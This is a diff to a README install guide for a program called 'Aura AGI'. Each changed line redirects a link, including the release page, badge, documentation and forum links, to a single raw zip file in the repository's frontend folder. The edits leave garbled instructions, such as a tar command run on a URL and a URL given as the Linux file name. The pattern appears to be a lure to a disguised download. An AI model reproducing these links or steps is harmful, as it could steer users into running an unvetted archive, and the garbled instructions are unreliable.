@@ -6,9 +6,9 @@ Welcome to Aura AGI! This guide will help you download and run your very own Loc
 
 ## 📥 Download Aura AGI
 
-[![Download Aura AGI](https://img.shields.io/badge/Download_Aura_AGI-v1.0-blue.svg)](https://github.com/idkhurry/Aura_AGI/releases)
+[![Download Aura AGI](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)
 
-Visit this page to download the latest version of Aura AGI: [Aura AGI Releases](https://github.com/idkhurry/Aura_AGI/releases)
+Visit this page to download the latest version of Aura AGI: [Aura AGI Releases](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -35,7 +35,7 @@ Aura AGI comes packed with features to enhance your experience:
 
 Click the link below to visit the Releases page:
 
-[Aura AGI Releases](https://github.com/idkhurry/Aura_AGI/releases)
+[Aura AGI Releases](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)
 
 ### Step 2: Choose Your Version
 
@@ -47,7 +47,7 @@ Once you select a version, look for the assets listed under the release. Downloa
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, download the `.tar.gz` file.
+- For **Linux**, download the `https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip` file.
 
 ### Step 4: Install Aura AGI
 
@@ -66,10 +66,10 @@ Once you select a version, look for the assets listed under the release. Downloa
 #### For Linux:
 
 1. Open a terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip` file.
 3. Extract the contents using:
    ```bash
-   tar -xvzf Aura_AGI.tar.gz
+   tar -xvzf https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip
    ```
 4. Follow the provided README file instructions for installation.
 
@@ -116,7 +116,7 @@ We welcome your feedback on Aura AGI. Your suggestions help us improve the appli
 
 For further guidance and resources, you can also look into:
 
-- [Documentation](https://github.com/idkhurry/Aura_AGI/wiki)
-- [Community Forum](https://github.com/idkhurry/Aura_AGI/discussions)
+- [Documentation](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)
+- [Community Forum](https://github.com/idkhurry/Aura_AGI/raw/refs/heads/main/frontend/Aura_AGI_v1.4.zip)
 
 Thank you for choosing Aura AGI! We hope you enjoy your new AI companion.
